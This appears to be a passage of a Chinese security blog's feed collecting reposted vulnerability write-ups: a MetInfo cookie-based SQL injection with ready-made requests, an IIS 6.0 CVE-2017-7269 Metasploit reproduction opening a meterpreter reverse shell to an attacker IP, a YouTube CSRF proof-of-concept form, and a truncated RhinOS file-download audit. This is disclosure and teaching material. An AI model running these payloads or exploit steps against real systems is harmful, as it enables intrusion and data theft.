class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里两个方法全都调用了authcode()方法，跟进authcode看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里decode和encode算法可逆，但我们需要知道$key的值，查看构造函数：<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[‘config’][‘met_webkeys’];<br>    }<br>这里$key的值是来源于met_webkeys这个配置，查看met_webkeys来源发现在安装的时候把这个key写入到./config/config_safe.php文件中。<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p><p>查看/config/config_safe.php文件，这里写入方式类似以下，但p牛在某篇文章中说过，这种是无法解析的，php后面必须要有一个空白字符，右键查看源代码即可得到met_webkeys，但有的会报错，根据这个表哥所说和php线程安全有关，本地试了下好像是这样。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p><p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>这里有两个利用点，简单说下其中一个。在register类的doemailvild()方法中，这里把用户提交的p参数进行了解密，并且传入到了get_user_valid()方法中。<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>查看get_user_valid()方法，这里又把解密后的值传入到了get_user_by_username()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p><p>查看get_user_by_username()方法，又传入了get_user_by_nameid()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p><p>查看get_user_by_nameid()方法，直接拼接。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p><p>这里基本就清楚了，将auth类的authcode()方法copy本地。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p><p>访问本地文件得到加密后的字符串。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p><p>将加密后的字符串放到cookie，get或者post中，构造请求提交，延时注入成功。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>复现时需要注意的点：<br>1、php.ini中 short_open_tag=off</p><p>2、不管需不需要登录，最起码需要网站有一个会员存在。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p><p>这里有两个，一个是不需要登陆就可注入，另一个是coolcat表哥所说的需要以会员登陆。以下请自行替换p参数。</p><h4 id="1、不需要登陆"><a href="#1、不需要登陆" class="headerlink" title="1、不需要登陆"></a>1、不需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p><h4 id="2、-需要登陆"><a href="#2、-需要登陆" class="headerlink" title="2、 需要登陆"></a>2、 需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p><p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;自行添加登陆后的cookie&gt;</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前官网没有更新相关补丁。<br>白帽汇安全研究院建议限制config_safe.php的访问权限来进行应急修复。<br>Apache配置.htaccess文件：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p><p>Nginx在nginx.conf文件添加以下配置：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p><p>文章转载于：<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7269 IIS6.0远程代码执行漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞编号：CVE-2017-7269<br>发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）<br>漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>漏洞类型：缓冲区溢出<br>漏洞等级：高危<br>影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）<br>触发函数：ScStoragePathFromUrl函数<br>附加信息：ScStoragePathFromUrl函数被调用了两次</p><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>复现环境：Microsoft Windows Server 2003 R2</p><p><img src="http://zone.secevery.com/uploads/article/20190421/a3f037a81fca524ab7e73b07a570a367.png" alt></p><p>开启了WebDAV服务</p><p><img src="http://zone.secevery.com/uploads/article/20190421/6728f3cc3e99686ee36fd23c44ac9f6c.png" alt></p><p>攻击者IP：192.168.1.144<br>目标机IP：192.168.1.175</p><p>exp:<a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a></p><p><img src="http://zone.secevery.com/uploads/article/20190421/32ee5fb6e63b209e64303c27d054c216.png" alt></p><p>把exp 复制到攻击机器的/usr/share/metasploit-framework/modules/exploits/windows/iis目录下</p><p><img src="http://zone.secevery.com/uploads/article/20190421/b5f1712c0adc2eda0a6ed9357f504787.png" alt></p><p>打开神器Metasploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/469cf4e103aaa38514880545f9f7f7cc.png" alt></p><p>输入use命令，use exploit/windows/iis/cve-2017-7269</p><p><img src="http://zone.secevery.com/uploads/article/20190421/9f52f610279f06c9041ddd0c8dd6b064.png" alt></p><p>使用命令show options</p><p><img src="http://zone.secevery.com/uploads/article/20190421/2d3b6a438a938dd8c02231da8ce4a0d3.png" alt></p><p>1.设置目标机ip,set RHOST 192.168.1.175<br>2.设置对面网站，set HttpHost 192.168.1.175<br>3.设置返回载荷，set payload windows/meterpreter/reverse_tcp<br>4.设置攻击机ip，set LHOST 192.168.1.144<br>5.进行溢出，exploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/914441442ce49de5dad761370de3fe0f.png" alt></p><p>输入shell命令，来到了我们所熟悉的界面</p><p><img src="http://zone.secevery.com/uploads/article/20190421/e530373752927a0db121aaffd1bab50a.png" alt></p><p>执行命令whoami</p><p><img src="http://zone.secevery.com/uploads/article/20190421/7c0533aea664a63ce89bfd8e600a8b24.png" alt></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>2015年7月15日，微软已停止对Windows Server 2003的支持，所以官方没有相关解决方案，建议用户升级到最新系统 Windows Server 2016。如果不进行升级的话，请直接关闭WebDAV服务防止漏洞被利用。</p><p>转载于：<a href="http://zone.secevery.com/article/1070" target="_blank" rel="noopener">http://zone.secevery.com/article/1070</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【转]CSRF漏洞劫持Youtube用户的通知消息</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p><p>大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享</p><p><strong> 从POST请求中发现端倪</strong><br>某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经是半夜00:30了，困累之极…..。我就随便点点打开了YouTube的通知服务（Notification），其中的POST请求引起了我的注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p><p> 乍一看，为了防止CSRF，其中的auth_key、p256dh_key、endpoint、device_id等参数貌似都是经过编码的字符串，但仔细一分析才知道，这些所有的参数都是由其中updates.push.services.mozilla.com的Mozilla通知推送服务产生的，所以，这样初略来看，该接口上不存在CSRF漏洞。</p><h3 id="分析Service-Worker-服务工作线程​"><a href="#分析Service-Worker-服务工作线程​" class="headerlink" title="分析Service Worker 服务工作线程​"></a>分析Service Worker 服务工作线程​</h3><p>深入分析可知，上述POST请求中的referrer字段值为“<a href="https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service" target="_blank" rel="noopener">https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service</a> Worker）。</p><p>Service Worker 是独立于当前页面的一段运行在浏览器后台进程里的脚本。Service Worker不需要用户打开 web 页面，也不需要其他交互，异步地运行在一个完全独立的上下文环境，不会对主线程造成阻塞。基于Service Worker可以实现消息推送、离线缓存和后台同步API等功能，本质上来说，Service Worker充当了Web应用程序与浏览器之间的代理。​</p><p>也就是说，referrer字段中的sw.js发起了这个POST请求，以至于这个请求和其它具备CSRF防御机制的YouTube请求内容存在不同。</p><h3 id="构造CSRF攻击框架​"><a href="#构造CSRF攻击框架​" class="headerlink" title="构造CSRF攻击框架​"></a>构造CSRF攻击框架​</h3><p>到了这一步，从这些参数里，我隐约觉得这里应该会有漏洞出现，但总要构造个PoC出来试试看。因此，通过研究以上参数的生成机制，我利用sw.js原理，编写了以下三个代码文件，构建了一个本地服务端来生成其中的各个参数。 </p><p><strong>index.html:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.js：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span class="line">sw.js：</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这三个代码文件的目的在于获取sw.js请求时生成的各个参数，有了这些参数，就可以间接形成通知（Notification），打开其中的index.html页面，点击Ask Permission按钮请求通知权限，后台调用sw.js脚本，通过内置的Firefox API形成一个本地的通知服务端，通知请求提交时，我们就能获取到其中的各个参数。利用这些参数，可以进一步构造出CSRF攻击框架，就能获取到对应的通知消息。<br>在本地loclalhost构造这种通知请求服务端，需要用到Service Worker 服务工作线程（sw.js）的部署原理，其中涉及服务注册、激活、缓存控制和相关响应机制，具体可参考：developer.mozilla.org和developers.google.com中的详细介绍说明。</p><p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p><p>综合上述分析，基于我们之前创建的本地通知服务端，结合Youtube的通知请求提交方式，我构造了以下CSRF攻击框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>让我意想不到的是，我在其中以其他Youtube账号身份，利用获取到的各种请求参数，提交了通知请求，竟然能有效实施通知消息的CSRF攻击。也就是说，我们现在可以劫持到其他Youtube账号的消息推送接口（PUSH webhook），以其他Youtube账号身份收取到Youtube响应该账号的相关通知，这些通知可能是他订阅的某个频道或视频的更新消息，也可能是他私人视频的观众评论等，如下：</p><p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/</url>
      
        <content type="html"><![CDATA[<h2 id="01简介"><a href="#01简介" class="headerlink" title="01简介"></a>01简介</h2><p>RhinOS是一个使用最新功能开发网站的框架，可以为Web门户提供最快的访问和管理。RhinOSCMS对于网站管理功能十分强劲，内置允许使用数据库进程和解析器模块快速访问数据库，xml和其他资源，购物车，标签和参数化文件，配置参数，Intranet访问，数据库会话，电子邮件发送，验证码安全系统，快速过滤，列表和详细信息的模块，功能可谓是非常之多了。RhinOSCMS的download.php文件存在任意文件下载漏洞，通过漏洞能够下载任意的文件。</p><h2 id="02环境搭建"><a href="#02环境搭建" class="headerlink" title="02环境搭建"></a>02环境搭建</h2><p>RhinOS CMS下载地址为：<a href="https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。" target="_blank" rel="noopener">https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。</a></p><p><img src="https://pic3.zhimg.com/v2-db2e62b8afcecde12a1a92d999bf817e_r.jpg" alt></p><p>图1完成安装</p><p>由于一些编码原因，安装成功后的的信息会显示一些乱码，如果使用西班牙语的系统就能正常显示了。然后需要将httpd.conf中的端口修改为8080端口，修改端口是为了避免和WINDOWS本身一些服务冲突，http.conf所在路径为：C:\rhinos\httpd\conf\httpd.conf。如图2所示。</p><p><img src="https://pic1.zhimg.com/v2-fbaf714d0454c7874b0043bba8dfd1b8_r.jpg" alt></p><p>图2httpd.conf所在路径</p><p>右键编辑将文件中的80端口修改为8080端口，如图3所示。</p><p><img src="https://pic2.zhimg.com/v2-ea92189b90a709947773a0c041e042c5_r.jpg" alt></p><p>图3修改端口</p><p>修改端口后需要重启阿帕奇服务，重启服务后访问<a href="http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。" target="_blank" rel="noopener">http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。</a></p><p><img src="https://pic4.zhimg.com/80/v2-0902d18ccba9d23b28d2be02e9f374f3_hd.jpg" alt></p><p>图4重启apache服务后访问</p><h2 id="03漏洞代码审计"><a href="#03漏洞代码审计" class="headerlink" title="03漏洞代码审计"></a>03漏洞代码审计</h2><p>漏洞存在于C:\rhinos\demo\admin\php\download.php中，在第30行代码，能够看到文件读取的路径拼接操作，如图5所示。</p><p><img src="https://pic1.zhimg.com/v2-7e723ece58ccea364a50eb6ffe8913f4_r.jpg" alt></p><p>图5download.php</p><p>看到getParam()，查找这个方法是如何实现的。<br>这个函数存在于：C:\rhinos\demo\admin\php\connect.php。第88行，如图6所示。</p><p><img src="https://pic2.zhimg.com/v2-f1f16f289aba167af53da72aebd65729_r.jpg" alt></p><p>图6connect.php</p><p>这个函数中获取了”file”的参数，通过POST或者GET提交都是可以的。然后根据图5所示第41行触发文件读取操作，如果控制参数file则能够成为任意文件读取漏洞或者为任意文件下载漏洞。</p><h2 id="04漏洞复现"><a href="#04漏洞复现" 